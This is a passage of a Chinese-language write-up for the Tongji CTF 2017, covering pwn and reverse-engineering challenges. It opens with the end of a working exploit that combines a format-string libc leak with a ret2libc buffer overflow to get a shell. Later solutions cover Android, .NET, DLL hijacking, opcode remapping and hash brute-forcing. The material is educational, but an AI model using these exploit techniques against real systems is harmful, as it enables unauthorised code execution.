+# obtain the address of __libc_start_main ret
+conn.writeline('%83$p' + shellcode1)
+libc_ret = conn.read(10)
+
+libc_temp = int(libc_ret, 16) - libcRetOff
+systemAddr = l32(libc_temp + systemOff)
+shellAddr = l32(libc_temp + shellOff)
+
+conn.read_until(&quot;sooo\n&quot;)
+
+# obtain shell
+shellcode2 = 'A' * 272 + systemAddr + 'AAAA' + shellAddr
+
+conn.writeline(shellcode2)
+conn.interact()
+</code></pre>
+
+<p>最后获得shell及flag：</p>
+<p><img alt="" src="images/pwn500-pwn.png" /></p>
+<p>(veni!! vidi!! vici!! boy you win:))</p>
+<h2 id="0x05-reverse"><a name="user-content-0x05-reverse" href="#0x05-reverse" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>0x05 Reverse</h2>
+<h3 id="reverse-100"><a name="user-content-reverse-100" href="#reverse-100" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>Reverse 100 这是一道签到题</h3>
+<pre><code>题目：听说隔壁有好几个跟我名字一样的？我才是真的签到题。。（是最近流行这个还是咋滴？听说某心云也是各种重名）
+</code></pre>
+
+<p>题目给出了一个<code>apk</code>，考查基础的Android逆向。</p>
+<p><code>apk</code>本质上是一个<code>zip</code>压缩包：</p>
+<pre><code class="bash">[guest@cruise ~]$ file AndroidReverse.apk
+AndroidReverse.apk: Zip archive data, at least v2.0 to extract
+</code></pre>
+
+<p>Android的开发语言可以是<code>C/C++</code>或者<code>Java</code>。<br />
+使用<code>C/C++</code>的话，一般通过<code>NDK</code>将其编译成类似<code>libxxx.so</code>的动态链接库，放在<code>lib</code>目录下。<br />
+使用<code>Java</code>的话，会被编译成类似<code>classes.dex</code>的<code>dex</code>文件。<br />
+观察解压后的文件夹发现没有<code>lib</code>目录，100分的题目比较简单，只需要反编译<code>classes.dex</code>即可。<br />
+通过<code>dex2jar</code>将<code>classes.dex</code>转换为<code>jar</code>包，使用<code>jd-gui</code>打开即可查看源码。（也可以用<code>apktools</code>解包<code>apk</code>，查看<code>smali</code>或者<code>smali2java</code>查看Java代码）</p>
+<pre><code class="java">//MainActivity.class
+...
+
+public class MainActivity
+  extends AppCompatActivity
+{
+  boolean CheckFlag(byte[] paramArrayOfByte)
+  {
+    return (paramArrayOfByte.length == 19) &amp;&amp; 
+    (paramArrayOfByte[0] == 116) &amp;&amp; 
+    (paramArrayOfByte[1] == 106) &amp;&amp; 
+    (paramArrayOfByte[2] == 123) &amp;&amp; 
+    (paramArrayOfByte[3] == 113) &amp;&amp; 
+    (paramArrayOfByte[4] == 115) &amp;&amp; 
+    (paramArrayOfByte[5] == 121) &amp;&amp; 
+    (paramArrayOfByte[6] == 100) &amp;&amp; 
+    (paramArrayOfByte[7] == 116) &amp;&amp; 
+    (paramArrayOfByte[8] == 121) &amp;&amp; 
+    (paramArrayOfByte[9] == 121) &amp;&amp; 
+    (paramArrayOfByte[10] == 95) &amp;&amp; 
+    (paramArrayOfByte[11] == 109) &amp;&amp; 
+    (paramArrayOfByte[12] == 121) &amp;&amp; 
+    (paramArrayOfByte[13] == 104) &amp;&amp; 
+    (paramArrayOfByte[14] == 99) &amp;&amp; 
+    (paramArrayOfByte[15] == 115) &amp;&amp; 
+    (paramArrayOfByte[16] == 108) &amp;&amp; 
+    (paramArrayOfByte[17] == 120) &amp;&amp; 
+    (paramArrayOfByte[18] == 125);
+  }
+
+  ...
+}
+</code></pre>
+
+<p>查询ASCII码表之后即可得到<strong>tj{qsydtyy_myhcslx}</strong>（青山一道同云雨，明月和曾是两乡，本来想作为LSB的flag的，后来因为某些原因。。。）</p>
+<h3 id="reverse-200-netten"><a name="user-content-reverse-200-netten" href="#reverse-200-netten" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>Reverse 200 .NETTEN.</h3>
+<pre><code>题目：When will my reflection show Who I am inside...
+</code></pre>
+
+<p>看题目的名字是.NET逆向，如果没有看出来也没有关系，可以通过PE查壳工具查看。</p>
+<p><img alt="" src="images/.NETTEN.-01.png" /></p>
+<p>或者在程序运行时，查看它加载的dll也能发现这是.NET程序。</p>
+<p><img alt="" src="images/.NETTEN.-02.jpg" /></p>
+<p>.NET的逆向分析工具比较多样，以ILSpy为例，先反编译查看源码：</p>
+<p><img alt="" src="images/.NETTEN.-03.png" /></p>
+<p>可以看到程序有一个名字为<code>ReflectionShell.ReflectionCore.exe</code>的嵌入式资源，程序运行后先加载这个资源，并将资源的每一个<code>byte</code>和<code>99</code>异或。最后使用反射的方法，运行该嵌入式资源（命令行参数原样传入）。</p>
+<p><img alt="" src="images/.NETTEN.-04.png" /></p>
+<p>选中该资源，点击save按钮，将资源剥离出来。</p>
+<p>写一个小程序脱壳：</p>
+<pre><code class="cpp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main()
+{
+    FILE *fp;
+    int   file_len;
+    char *data;
+    int   i;
+
+    fp = fopen(&quot;ReflectionShell.ReflectionCore.exe&quot;, &quot;rb&quot;);
+    fseek(fp, 0, SEEK_END);
+    file_len = ftell(fp);
+    fseek(fp, 0, SEEK_SET);
+    data = (char*)malloc(sizeof(char) * file_len);
+    fread(data, file_len, 1, fp);
+    fclose(fp);
+    for (i = 0; i &lt; file_len; i++)
+        data[i] ^= 99;
+    fp = fopen(&quot;ReflectionShell.ReflectionCore-1.exe&quot;, &quot;wb&quot;);
+    fwrite(data, file_len, 1, fp);
+    fclose(fp);
+
+    return 0;
+}
+</code></pre>
+
+<p>反编译<code>ReflectionShell.ReflectionCore-1.exe</code>：</p>
+<p><img alt="" src="images/.NETTEN.-05.png" /></p>
+<p>可以看到flag的判断逻辑：</p>
+<pre><code class="cpp">flag.Length == 33 &amp;&amp;
+!(flag.Substring(0, 3) != &quot;tj{&quot;) &amp;&amp;
+!(Program.Md5(flag.Substring(3, 3)) != &quot;7D115AE79B229A96B6656375F493C2DF&quot;) &amp;&amp;
+!(Program.Base64(flag.Substring(6, 16)) != &quot;X1Vqb3VfUjNAY2xjbHk/Lg==&quot;) &amp;&amp;
+!(Program.Sha1(flag.Substring(22, 3)) != &quot;029BC2B0067000E122D2286DCF774961625FAC14&quot;) &amp;&amp;
+!(flag.Substring(25, 8) != &quot;_iS_Ez!}&quot;)
+</code></pre>
+
+<p><code>Md5</code>明文为<strong>4re</strong>(<a href="http://www.cmd5.com/">http://www.cmd5.com/</a>)可以查到；<br />
+<code>base64</code>解码为<strong>_Ujou_R3@clcly?.</strong>；<br />
+<code>sha1</code>为<strong>NET</strong>；<br />
+拼凑后得出flag为<strong>tj{4re_Ujou_R3@clcly?.NET_iS_Ez!}</strong>（Are_you_readdy?.NET_is_easy）。</p>
+<h3 id="reverse-300-hijack"><a name="user-content-reverse-300-hijack" href="#reverse-300-hijack" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>Reverse 300 Hijack</h3>
+<pre><code>题目：Remind大一的时候写了一个二维码生成程序，写的时候只有他和老天知道他在写什么；现在过了两年，只有老天知道他当时写的是什么了。
+</code></pre>
+
+<p>给出了一个<code>exe</code>和<code>dll</code>，<code>exe</code>里几乎每个函数都被加了花指令，而且通过二维码算法在命令行中生成了二维码，静态分析很困难，题目给出了不要过多在意<code>exe</code>的暗示，题目名字是<code>Hijack</code>，暗示是<code>dll hijack</code>，即<code>dll劫持</code>。</p>
+<p>主要看<code>dll</code>，可以看到两个导出函数：</p>
+<p><img alt="" src="images/Hijack-01.png" /></p>
+<p>这两个函数什么都没做，空函数。直接运行程序出来一个二维码：</p>
+<p><img alt="" src="images/Hijack-02.png" /></p>
+<p>扫描结果是“the calling order of the DLL export function”，提示是dll导出函数的调用顺序。</p>
+<p>那么很简单，只要替换掉这个dll，保持导出函数名和参数不变，自己在里面加入简单的输出逻辑，记录调用顺序即可，这个需要用VS写一个dll。</p>
+<p>这里就简单地用<code>printf</code>了：</p>
+<p><img alt="" src="images/Hijack-03.png" /></p>
+<p>替换运行可以得到这样一串输出：</p>
+<p>011101000110101001111011001101110011000001110101010111110011000101101001010000000110111000111001010111110110100001010101011000010100111001011111011110100111110000101101011111000111010101111101</p>
+<p>做一个简单的转换：</p>
+<pre><code class="cpp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main()
+{
+    char str[] = &quot;011101000110101001111011001101110011000001110101010111110011000101101001010000000110111000111001010111110110100001010101011000010100111001011111011110100111110000101101011111000111010101111101&quot;;
+    int i, j;
+    for (i = 0; str[i] != '\0'; i+=8) {
+        char ch = 0;
+        for (j = 0; j &lt; 8; j++) {
+            ch *= 2;
+            ch += (str[i + j] - '0');
+        }
+
+        printf(&quot;%c&quot;, ch);
+    }
+    return 0;
+}
+
+</code></pre>
+
+<p>二进制8位转1位ASCII得到<strong>tj{70u_1i@n9_hUaN_z|-|u}</strong>（偷梁换柱）。</p>
+<h3 id="reverse-400-quanter"><a name="user-content-reverse-400-quanter" href="#reverse-400-quanter" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>Reverse 400 Quanter</h3>
+<pre><code>题目：Remind想要进行程序化交易，但由于证监会视其为洪水猛兽，下令对其进行了封杀，因此各券商逐步关闭了交易接口。贼心不死的Remind在网上找到了通达信的dll及其导出函数的使用说明。可惜的是，这个dll是收费的，每个dll绑定一个交易账户，初步分析后发现，dll作者首先会将用户的交易账户通过某种算法加密后内置在dll中，当使用dll的导出函数进行登陆时，会对交易账户做校验，如果不符合则无法交易。Remind想要让大家都可以享受量化交易的乐趣，而不需要支付高额的费用，于是他想请你帮他研究一下这个加密算法。如果能从密文反推出明文（交易账户），那么离彻底破解也就不远了，你能帮帮他吗？（上文为背景，本次比赛试题已将dll、交易函数等无关内容剥离，只需关注如何破解加密算法即可）
+</code></pre>
+
+<p>扔到IDA里逆向看一下<code>main</code>函数，首先输入一个最长不超过<code>63</code>字节的字符串，然后对其做加密，最后将结果和密文比较一下：</p>
+<p><img alt="" src="images/Quanter-01.png" /></p>
+<p>看一下具体的加密算法，也就是<code>sub_401080</code>：</p>
+<pre><code class="cpp">char __fastcall sub_401080(char *a1, int a2)
+{
+  unsigned int v2; // ebx@1
+  char *v3; // edx@1
+  int v4; // esi@1
+  char result; // al@2
+  signed int v6; // edx@4
+  unsigned int v7; // ebx@4
+  signed int v8; // eax@4
+  signed int v9; // ecx@6
+  signed int v10; // ebx@6
+  char *v11; // ecx@14
+  bool v12; // cf@16
+  unsigned int v13; // [sp+Ch] [bp-1Ch]@4
+  int v14; // [sp+10h] [bp-18h]@1
+  char *v15; // [sp+14h] [bp-14h]@1
+  int v16; // [sp+18h] [bp-10h]@1
+  signed __int16 v17; // [sp+1Ch] [bp-Ch]@1
+  signed int v18; // [sp+20h] [bp-8h]@4
+  signed int v19; // [sp+24h] [bp-4h]@4
+
+  v14 = a2;
+  v2 = 0;
+  v3 = a1;
+  v15 = a1;
+  v16 = 0;
+  v17 = 1374;
+  v4 = 0;
+  do
+    result = *v3++;
+  while ( result );
+  if ( v3 != a1 + 1 )
+  {
+    do
+    {
+      v6 = 1;
+      v7 = ((unsigned int)(unsigned __int16)v17 &gt;&gt; 8) ^ a1[v2];
+      v19 = 1;
+      v13 = v7;
+      v17 = 8319 * (v7 + v17) - 21053;
+      v8 = 65;
+      v18 = 65;
+      do
+      {
+        if ( !v6 )
+          break;
+        v9 = 90;
+        v10 = v7 + 1665;
+        do
+        {
+          if ( !v6 )
+            break;
+          v8 = v18;
+          if ( v10 % 26 || v10 / 26 != v18 )
+          {
+            v6 = v19;
+          }
+          else
+          {
+            *(_BYTE *)(v4 + v14) = v18;
+            *(_BYTE *)(v4 + v14 + 1) = v9;
+            v4 += 2;
+            v6 = 0;
+            v19 = 0;
+          }
+          --v9;
+          ++v10;
+        }
+        while ( v9 &gt;= 65 );
+        v7 = v13;
+        v18 = ++v8;
+      }
+      while ( v8 &lt; 91 );
+      v11 = v15;
+      v2 = v16++ + 1;
+      do
+        result = *v11++;
+      while ( result );
+      v12 = v2 &lt; v11 - (v15 + 1);
+      a1 = v15;
+    }
+    while ( v12 );
+  }
+  return result;
+}
+
+</code></pre>
+
+<p>反推有点困难，但是基本可以知道，1个char会加密成两个可见的类似16进制的char，于是可以穷举遍历。</p>
+<pre><code class="cpp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+#define _BYTE char
+
+char __fastcall sub_401080(char *a1, char *a2)
+{
+  ...
+}
+
+int main()
+{
+    const char str_std[] = &quot;EJAFDTHQDVCWJDDSJNDHCJEZCGJSJKGREIFAHVDKIICBHLJFJQEUFMFWCQIUFLHGCFGWJABIFMGEEM&quot;;
+    char       str_gen[128];
+    char       flag[64];
+    int        i, j;
+
+    memset(flag, 0, 64);
+    for (j = 0; j &lt; strlen(str_std) / 2; j++) {
+        for (i = 0; i &lt; 255; i++) {
+            flag[j] = i;
+            memset(str_gen, 0, 128);
+            sub_401080(flag, str_gen);
+            if (str_gen[j * 2] == str_std[j * 2] &amp;&amp; str_gen[j * 2 + 1] == str_std[j * 2 + 1]) {
+                printf(&quot;%s\n&quot;, flag);
+                break;
+            }
+        }
+    }
+    //
+
+    return 0;
+
+</code></pre>
+
+<p><img alt="" src="images/Quanter-02.png" /></p>
+<p><strong>tj{N07_oN!y_A_coDeR_8ut_aLSo_4_qu@n73r}</strong>（Not_only_a_coder_but_also_a_quanter）</p>
+<h3 id="reverse-500-i-wrote-python"><a name="user-content-reverse-500-i-wrote-python" href="#reverse-500-i-wrote-python" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>Reverse 500 I wrote Python</h3>
+<pre><code>题目：题面还真的不好编呢，参见题目吧。
+</code></pre>
+
+<p>这道题给出了一个编译后的Python字节码文件<code>flag.pyc</code>，以及一套Python环境。<br />
+如果尝试用自己的Python是没有办法运行这个pyc的。<br />
+运行题目给出的Python，尝试用Python自带的反汇编模块<code>dis</code>，发现<code>opcode</code>模块不存在：</p>
+<pre><code class="bash">C:\Users\xbj1108_25\Desktop\Data\同济大学\CTF\Tongji_CTF_2017\Reverse\Python\tmp&gt;python
+Python 3.6.2 (default, Oct  6 2017, 17:47:41) [MSC v.1900 32 bit (Intel)] on win32
+Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
+&gt;&gt;&gt; import dis
+Traceback (most recent call last):
+  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
+  File &quot;C:\Users\xbj1108_25\Desktop\Data\同济大学\CTF\Tongji_CTF_2017\Reverse\Python\tmp\lib\dis.py&quot;, line 8, in &lt;module&gt;
+    from opcode import *
+ModuleNotFoundError: No module named 'opcode'
+&gt;&gt;&gt;
+</code></pre>
+
+<p>从<code>python3.6.2</code>源码中拷贝一份<code>opcode.py</code>到<code>Lib</code>目录下后再反汇编。<br />
+通过序列化反序列化模块<code>marshal</code>可以加载pyc，pyc的其他结构没有什么问题，但是opcode不正确，初步怀疑是置换了opcode。</p>
+<pre><code class="bash">C:\Users\xbj1108_25\Desktop\Data\同济大学\CTF\Tongji_CTF_2017\Reverse\Python\tmp&gt;python
+Python 3.6.2 (default, Oct  6 2017, 17:47:41) [MSC v.1900 32 bit (Intel)] on win32
+Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
+&gt;&gt;&gt; import dis
+&gt;&gt;&gt; import marshal
+&gt;&gt;&gt;
+&gt;&gt;&gt; fd = open('flag.pyc', 'rb')
+&gt;&gt;&gt; header_bytes = fd.read(12)
+&gt;&gt;&gt; co = marshal.load(fd)
+&gt;&gt;&gt; dis.dis(co)
+ 22           0 LOAD_CONST               0 ('please input the flag:')
+              2 CALL_FUNCTION            0
+              4 LOAD_NAME                1 (flag)
+              6 STORE_NAME               1 (flag)
+
+ 24           8 LOAD_CONST               2 ('Failure')
+             10 LOAD_CONST               1 (28)
+             12 LOAD_NAME                1 (flag)
+             14 CALL_FUNCTION            1
+             16 EXTENDED_ARG             3
+Traceback (most recent call last):
+  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
+  File &quot;C:\Users\xbj1108_25\Desktop\Data\同济大学\CTF\Tongji_CTF_2017\Reverse\Python\tmp\lib\dis.py&quot;, line 60, in dis
+    disassemble(x, file=file)
+  File &quot;C:\Users\xbj1108_25\Desktop\Data\同济大学\CTF\Tongji_CTF_2017\Reverse\Python\tmp\lib\dis.py&quot;, line 335, in disassemble
+    co.co_consts, cell_names, linestarts, file=file)
+  File &quot;C:\Users\xbj1108_25\Desktop\Data\同济大学\CTF\Tongji_CTF_2017\Reverse\Python\tmp\lib\dis.py&quot;, line 346, in _disassemble_bytes
+    line_offset=line_offset):
+  File &quot;C:\Users\xbj1108_25\Desktop\Data\同济大学\CTF\Tongji_CTF_2017\Reverse\Python\tmp\lib\dis.py&quot;, line 315, in _get_instructions_bytes
+    argval = cmp_op[arg]
+IndexError: tuple index out of range
+&gt;&gt;&gt;
+</code></pre>
+
+<p>接下来要得到正确的opcode置换表，如果逆向Python虚拟机那代价太大，可以自己编写一份用到了所有<code>python3.6.2</code>中opcode的Python代码，然后用原版的python和修改版的python分别编译一遍，两相对比即可得到opcode置换表。</p>
+<p>这里写了一份<code>all.py</code>，参见<code>附录1</code>。</p>
+<p>写个小程序对比opcode，原理很简单，逐字符比较就行了，这里就不放代码了。</p>
+<pre><code class="bash">C:\Users\xbj1108_25\Desktop\Data\同济大学\CTF\Tongji_CTF_2017\Reverse\Python\RemapOpcode\Debug&gt;RemapOpcode.exe
+已复制         1 个文件。
+已复制         1 个文件。
+Opmap building: general_opcode = 100, replace_opcode = 131
+Opmap building: general_opcode = 1, replace_opcode = 62
+Opmap building: general_opcode = 131, replace_opcode = 101
+Opmap building: general_opcode = 101, replace_opcode = 100
+Opmap building: general_opcode = 25, replace_opcode = 23
+Opmap building: general_opcode = 19, replace_opcode = 63
+Opmap building: general_opcode = 20, replace_opcode = 25
+Opmap building: general_opcode = 23, replace_opcode = 24
+Opmap building: general_opcode = 24, replace_opcode = 26
+Opmap building: general_opcode = 26, replace_opcode = 20
+Opmap building: general_opcode = 62, replace_opcode = 1
+Opmap building: general_opcode = 63, replace_opcode = 19
+Opmap building: general_opcode = 144, replace_opcode = 114
+Opmap building: general_opcode = 110, replace_opcode = 106
+Opmap building: general_opcode = 107, replace_opcode = 144
+Opmap building: general_opcode = 114, replace_opcode = 107
+Opmap building: general_opcode = 106, replace_opcode = 110
+</code></pre>
+
+<p>拿到opcode置换表之后，有几种思路可以得到flag：</p>
+<ul>
+<li>修改对应的Lib/opcode.py，直接用dis反汇编模块查看</li>
+<li>二进制修改flag.py，通过python源码可以了解到pyc的结构，由于只存在一个代码段，而且指令长度相同，因此修改也很方便</li>
+<li>修改python3的反编译引擎</li>
+</ul>
+<p>python3的反编译引擎有不少，这里以<code>uncompyle6</code>为例，uncompyle6中依赖xdis模块获取python各个版本的opcode，因此需要修改xdis模块，主要修改<code>xdis\opcodes\opcode_3x.py</code>。</p>
+<p>反编译后即可获得源码：</p>
+<pre><code class="python">flag = input(&quot;please input the flag:&quot;)
+
+if  len(flag) != 28:
+    print(&quot;Failure&quot;)
+    exit()
+if  flag[ 0] != 't':
+    print(&quot;Failure&quot;)
+    exit()
+if  flag[ 1] != 'j':
+    print(&quot;Failure&quot;)
+    exit()
+if  flag[ 2] != '{':
+    print(&quot;Failure&quot;)
+    exit()
+if  flag[ 3] != chr(ord('!') + 15):
+    print(&quot;Failure&quot;)
+    exit()
+if  flag[ 4] != chr(ord('u') -  5):
+    print(&quot;Failure&quot;)
+    exit()
+if  flag[ 5] != 'C':
+    print(&quot;Failure&quot;)
+    exit()
+if  flag[ 6] != chr(110 + ord('\x01')):
+    print(&quot;Failure&quot;)
+    exit()
+if  flag[ 7] != chr(ord('&quot;') * 2):
+    print(&quot;Failure&quot;)
+    exit()
+if  flag[ 8] != chr(404 &gt;&gt; ord('\x02')):
+    print(&quot;Failure&quot;)
+    exit()
+if  flag[ 9] != chr(ord(' ') + 63):
+    print(&quot;Failure&quot;)
+    exit()
+if  flag[10] != chr(ord('H') + 32):
+    print(&quot;Failure&quot;)
+    exit()
+if  flag[11] != chr(ord('\x08') ** 2):
+    print(&quot;Failure&quot;)
+    exit()
+if  flag[12] != chr(ord('s'.upper())):
+    print(&quot;Failure&quot;)
+    exit()
+if  flag[13] != chr(ord('\x13') * 5):
+    print(&quot;Failure&quot;)
+    exit()
+if  flag[14] != str(8):
+    print(&quot;Failure&quot;)
+    exit()
+if  flag[15] != chr(ord('d') + 1):
+    print(&quot;Failure&quot;)
+    exit()
+if  flag[16] != chr(ord('f') - 1):
+    print(&quot;Failure&quot;)
+    exit()
+if  flag[17] != chr(ord('\'') * 2):
+    print(&quot;Failure&quot;)
+    exit()
+if  flag[18] != chr(95):
+    print(&quot;Failure&quot;)
+    exit()
+if  flag[19] != 'R'.lower():
+    print(&quot;Failure&quot;)
+    exit()
+if  flag[20] != 'E'.upper():
+    print(&quot;Failure&quot;)
+    exit()
+if  flag[21] != chr(ord('\x14') &lt;&lt; 2):
+    print(&quot;Failure&quot;)
+    exit()
+if  flag[22] != str(int('1')):
+    print(&quot;Failure&quot;)
+    exit()
+if  flag[23] != 'a':
+    print(&quot;Failure&quot;)
+    exit()
+if  flag[24] != 'c':
+    print(&quot;Failure&quot;)
+    exit()
+if  flag[25] != 'e':
+    print(&quot;Failure&quot;)
+    exit()
+if  flag[26] != 'D':
+    print(&quot;Failure&quot;)
+    exit()
+if  flag[27] != '}':
+    print(&quot;Failure&quot;)
+    exit()
+print('Success')
+</code></pre>
+
+<p>显而易见<strong>tj{0pCoDe_h@S_8eeN_rEP1aceD}</strong>（opcode_has_been_replaced）</p>
+<h3 id="reverse-500-vmp"><a name="user-content-reverse-500-vmp" href="#reverse-500-vmp" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>Reverse 500 VMP</h3>
+<pre><code>题目：杀毒软件有可能会误报，本次比赛所有的可执行文件均无恶意代码，请放心使用
+</code></pre>
+
+<p>用IDA查看，首先在<code>main</code>函数中，调用了<code>IsDebuggerPresent</code>函数，判断自身是否被动态调试，如果是的话则结束进程。可以通过二进制修改x86汇编中的跳转指令来绕过这个检测。</p>
+<p><img alt="" src="images/VMP-01.png" /></p>
+<p>接着是一个很关键的<code>sub_401080</code>函数，查看汇编指令可以发现这是一个很简单的虚拟机，根据操作码执行不同的操作。0x01则PUSH，0x02则CALL，指令为如下结构体：</p>
+<pre><code class="cpp">typedef char vm_opcode;       //操作码
+typedef int  vm_operand;      //操作数
+typedef struct vm_instruction //指令
+{
+    vm_opcode  opcode;
+    vm_operand operand1;
+    vm_operand operand2;
+    vm_operand operand3;
+} vm_instruction_t;
+</code></pre>
+
+<p>通过自己<code>push</code>和<code>call</code>来完成函数调用，首先取两个函数地址，分别用两个字符串<code>tj{maybe_the_ti</code>及<code>me_isn't_right}</code>对其进行异或操作。其中一个是hash函数，另外一个函数将51位的flag三位一组进行该hash运算，并对比结果。由于hash不可逆，因此只能爆破，好在只有三位，而且出题目的时候测试过，没有hash碰撞的情况。</p>
+<p>写个程序暴力枚举：</p>
+<pre><code class="cpp">#define _CRT_SECURE_NO_WARNINGS
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+unsigned int stringtoid(const char *str)
+{
+    int             i;
+    unsigned int    v;
+    unsigned m[70];
+    strncpy((char *)m, str, 256);
+    for (i = 0; i &lt; 256 / 4 &amp;&amp; m[i]; i++)
+        ;
+    m[i++] = 0x9BE74448;
+    m[i++] = 0x66F42C48;
+    v = 0xF4FA8928;
+
+    __asm {
+        mov esi, 0x37A8470E
+        mov edi, 0x7758B42B
+        xor ecx, ecx
+        _loop :
+        mov ebx, 0x267B0B11
+            rol v, 1
+            lea eax, m
+            xor ebx, v
+            mov eax, [eax + ecx * 4]
+            mov edx, ebx
+            xor esi, eax
+            xor edi, eax
+            add edx, edi
+            or edx, 0x2040801
+            and edx, 0xBFEF7FDF
+            mov eax, esi
+            mul edx
+            adc eax, edx
+            mov edx, ebx
+            adc eax, 0
+            add edx, esi
+            or edx, 0x804021
+            and edx, 0x7DFEFBFF
+            mov esi, eax
+            mov eax, edi
+            mul edx
+            add edx, edx
+            adc eax, edx
+            jnc _skip
+            add eax, 2
+            _skip:
+        inc ecx;
+        mov edi, eax
+            cmp ecx, i
+            jnz _loop
+            xor esi, edi
+            mov v, esi
+    }
+    return v;
+}
+
+int add_with_carry(int *subscript, char *entry, int i, const char *set, int set_size, int entry_size)
+{
+    if (i &gt;= entry_size)
+        return -1;
+
+    if (subscript[i] + 1 &lt; set_size) {
+        subscript[i]++;
+        entry[i] = set[subscript[i]];
+        return 0;
+    }
+    else {
+        subscript[i] = 0;
+        entry[i] = set[subscript[i]];
+        return add_with_carry(subscript, entry, i + 1, set, set_size, entry_size);
+    }
+}
+
+void hash_blasting(const char *set, int set_size, int entry_size, int *target_dict, int target_dict_size)
+{
+    int  *subscript;
+    char *entry;
+    char flag[100] = { 0 };
+    subscript = (int *)malloc(sizeof(int)  * entry_size);
+    entry = (char*)malloc(sizeof(char) * entry_size + 1);
+
+    int i;
+    for (i = 0; i &lt; entry_size; i++) {
+        subscript[i] = 0;
+        entry[i] = set[subscript[i]];
+    }
+    entry[i] = '\0';
+
+    while (1)
+    {
+        int id = stringtoid(entry);
+        for (i = 0; i &lt; target_dict_size; i++) {
+            if (id == target_dict[i]) {
+                printf(&quot;%02d - %08X - [%s]\n&quot;, i, id, entry);
+                memcpy(flag + 3 * i, entry, 3);
+            }
+        }
+
+        if (add_with_carry(subscript, entry, 0, set, set_size, entry_size) == -1)
+            break;
+    }
+
+    printf(&quot;flag = %s\n&quot;, flag);
+
+    free(entry);
+    free(subscript);
+}
+
+int main(int argc, char **argv)
+{
+    char graph_chars[] = &quot; !\&quot;#$%&amp;'()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~&quot;;
+    int  target_dict[] = { 
+        0x400A7A71, 0xBE0A9967, 0xED26C8B1, 0x9BFB132F, 0x4B0C5A46, 0x4F14EAAE, 0xE6FEDCB8, 0xE3E3A0DB,
+        0x5A653E54, 0x7A757C7B, 0xFD89E867, 0xD9B384DD, 0xE5EAEC06, 0x9203B544, 0x43FF82A7, 0x159226D6,
+        0x2742FD2E };
+    hash_blasting(graph_chars, strlen(graph_chars), 3, target_dict, sizeof(target_dict));
+    system(&quot;pause&quot;);
+    return 0;
+}
+</code></pre>
+
+<p>得到flag：</p>
+<pre><code class="bash">07 - E3E3A0DB - [_w0]
+01 - BE0A9967 - [th1]
+15 - 159226D6 - [3t7]
+09 - 7A757C7B - [_8E]
+08 - 5A653E54 - [rsE]
+05 - 4F14EAAE - [ys_]
+04 - 4B0C5A46 - [VVa]
+14 - 43FF82A7 - [t_b]
+13 - 9203B544 - [_ge]
+03 - 9BFB132F - [_@l]
+10 - FD89E867 - [for]
+02 - ED26C8B1 - [N9s]
+06 - E6FEDCB8 - [G3t]
+11 - D9B384DD - [e_t]
+12 - E5EAEC06 - [Hey]
+00 - 400A7A71 - [tj{]
+16 - 2742FD2E - [eR}]
+flag = tj{th1N9s_@lVVays_G3t_w0rsE_8Efore_tHey_get_b3t7eR}
+请按任意键继续. . .
+</code></pre>
+
+<p><strong>tj{th1N9s_@lVVays_G3t_w0rsE_8Efore_tHey_get_b3t7eR}</strong>（things_always_get_worse_before_they_get_better）</p>
+<h3 id="1allpy"><a name="user-content-1allpy" href="#1allpy" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>附录1：all.py</h3>
+<pre><code class="python">from __future__ import division
+from __future__ import with_statement
+import sys
+
+global g_a
+
+#define POP_TOP                   1
+(lambda:1)()
+
+#define ROT_TWO                   2
+a = 1
+b = 2
+(a, b) = (b, a)
+
+#define ROT_THREE                 3
+a = 1
+(a, a, a) = (a, a, a)
+
+#define DUP_TOP                   4
+a = 1
+c = b = a
+
+#define DUP_TOP_TWO               5
+a = [1, 2]
+a[0] += 3;
+
+#define NOP                       9
+
+#define UNARY_POSITIVE           10
+a = 1
+a = +a
+
+#define UNARY_NEGATIVE           11
+a = 1
+a = -a
+
+#define UNARY_NOT                12
+a = 1
+a = not a
+
+#define UNARY_INVERT             15
+a = 1
+a = ~a
+
+#define BINARY_MATRIX_MULTIPLY   16
+class MyMatrix:
+    def __matmul__(self, other):
+        pass
+a = MyMatrix()
+a = a @ a
+
+#define INPLACE_MATRIX_MULTIPLY  17
+a = MyMatrix()
+a @= a
+
+#define BINARY_POWER             19
+a = 2
+a = a ** 2
+
+#define BINARY_MULTIPLY          20
+a = 2
+a = a * 2
+
+#define BINARY_MODULO            22
+a = 2
+a = a % 2
+
+#define BINARY_ADD               23
+a = 2
+a = a + 2
+
+#define BINARY_SUBTRACT          24
+a = 2
+a = a - 2
+
+#define BINARY_SUBSCR            25
+a = [1]
+a[0]
+
+#define BINARY_FLOOR_DIVIDE      26
+a = 2
+a = a // 2
+
+#define BINARY_TRUE_DIVIDE       27
+# from __future__ import division
+a = 2
+a = a / 2
+
+#define INPLACE_FLOOR_DIVIDE     28
+a = 1
+a //= 1
+
+#define INPLACE_TRUE_DIVIDE      29
+# from __future__ import division
+a = 1
+a /= 2
+
+#define GET_AITER                50
+#define GET_ANEXT                51
+async def FUNC_GET_AITER(b, c):
+    async for b in c:
+        pass
+
+#define BEFORE_ASYNC_WITH        52
+async def FUNC_BEFORE_ASYNC_WITH(b):
+    async with b:
+        pass
+
+#define INPLACE_ADD              55
+a = 1
+a += 1
+
+#define INPLACE_SUBTRACT         56
+a = 1
+a -= 1
+
+#define INPLACE_MULTIPLY         57
